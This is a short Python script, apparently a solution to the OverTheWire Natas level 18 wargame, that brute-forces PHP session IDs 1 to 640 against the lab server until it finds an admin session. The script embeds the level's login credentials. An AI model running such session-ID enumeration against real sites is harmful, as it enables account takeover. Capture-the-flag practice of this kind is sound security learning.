
import requests

url = "http://natas18.natas.labs.overthewire.org/"
auth = ("natas18","fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op")

for session_id in range(1,641):
    cookies = {"PHPSESSID":str(session_id)}

    r = requests.get(url=url,auth=auth,cookies=cookies)

    if "You are an admin" in r.text:
        print(f"Found admin session : {session_id}")
        print(r.text)
        break
    else :
        print(f"Processing : {session_id}")
else:
    print("Admin not found in range 1 - 641")